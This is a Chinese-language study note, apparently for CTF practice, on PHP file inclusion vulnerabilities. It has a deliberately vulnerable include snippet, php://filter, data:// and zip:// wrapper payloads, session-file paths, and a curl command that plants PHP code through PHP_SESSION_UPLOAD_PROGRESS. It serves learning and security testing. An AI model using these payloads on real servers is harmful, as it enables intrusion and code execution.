# PHP 文件包含漏洞

把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一过程被称为包含。

`include()`
`include_once()`
`require()`
`require_once()`

在通过 PHP 函数引入文件时，如果传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。

文件包含漏洞分为两个类型，分别本地文件包含（Local File Inclusion，LFI）和远程文件包含（Remote File Inclusion，RFI）

> 文件包含的文件无须是`php`后缀，只要文件内容符合PHP语法规范，任何扩展名都可以执行

```php
<?php
$file = $_GET['file'];
include($file);
```

## PHP 封装伪协议

PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数，[了解更多](https://www.php.net/manual/zh/wrappers.php)

`file`

### php://filter

```
php://filter/read=convert.base64-enccode/resource=
```

### data://

```url
?file=data://text/plain,<?php phpinfo();?>
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
//data:text/plain
```

### input://

### phar://

### zip://

```
?file=zip://./foo.zip#bar.txt
?file=phar://my.phar/somefile.php
```

> `phar://`读取phar文件时，会反序列化meta-data储存的信息

### convert.iconv:// and dechunk://

## 文件包含漏洞利用

- 包含上传的含有 PHP 代码的任意类型文件，比如图片木马
- 包含 session 文件

> 默认存放路径`/var/`
> phpinfo信息中，php.ini，PHP代码
session.save_path

- 包含服务器日志
- 读取服务器敏感文件

## 泄露文件内容

#### PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE

<https://github.com/synacktiv/php_filter_chains_oracle_exploit/>

## LFI2RCE

### PHP 过滤器实现任意内容生成

### session 文件包含

```
/tmp/sess_<id>
/tmp/sessions/sess_<id>
/var/lib/php/sess_<id>
/var/lib/php/sessions/sess_<id>
/var/lib/php<version>/sess_<id>
/var/lib/php<version>/sessions/sess_<id>
...
```

### `PHP_SESSION_UPLOAD_PROGRESS`

PHP_SESSION_UPLOAD_PROGRESS 是 PHP 中用于处理文件上传进度的特性，主要用于监控用户上传文件时的进度信息。

`session.upload_progress.enabled`默认启用。
`session.upload_progress.cleanup`默认启用，上传完成后会立即清除进度信息。

```html
<form action="http://localhost:13454/upload.php" method="post" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" value="上传文件" />
</form>
```

<https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py>

```bash
curl http://<IP>:<PORT> --cookie 'PHPSESSID=test' -F 'PHP_SESSION_UPLOAD_PROGRESS=<PHP_CODE>' -F 'file=@junk_file'
```

```
upload_progress_<PHP_CODE>|a:5:{s:10:”start_time”;i:1623754711;s:14:”content_length”;i:342;s:15:”bytes_processed”;i:342;s:4:”done”;b:1;s:5:”files”;a:1:{i:0;a:7:{s:10:”field_name”;s:4:”file”;s:4:”name”;s:9:”junk_file”;s:8:”tmp_name”;s:14:”/tmp/phpAelEHl”;s:5:”error”;i:0;s:4:”done”;b:1;s:10:”start_time”;i:1623754711;s:15:”bytes_processed”;i:17;}}}
```

`exp.py`:

```python
```

- [第五空间 2021]EasyCleanup
- QAQ_1inclu4e

<https://d4rkstat1c.medium.com/mr-burns-hackthebox-writeup-c06f90a22fa9>

## 练习题

- ACTF2020 新生赛 Include
- [羊城杯 2020]Easyphp2

## 参考资料

- <https://github.com/D35m0nd142/LFISuite>
